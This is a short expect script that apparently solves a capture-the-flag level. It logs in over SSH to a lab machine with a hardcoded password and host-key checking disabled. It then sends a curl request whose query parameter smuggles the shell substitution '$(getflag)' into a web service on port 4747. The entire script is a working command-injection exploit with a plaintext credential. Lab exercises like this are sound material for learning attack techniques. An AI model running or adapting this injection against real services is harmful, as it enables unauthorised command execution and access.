#!/usr/bin/expect -f
set ip 192.168.1.103
spawn ssh -o "StrictHostKeyChecking no" level04@$ip -p 4242 "curl -s '$ip:4747/?x=\$\(getflag\)'"
expect "sword:"
send "qi0maab88jeaj46qoumi7maus\r"
interact
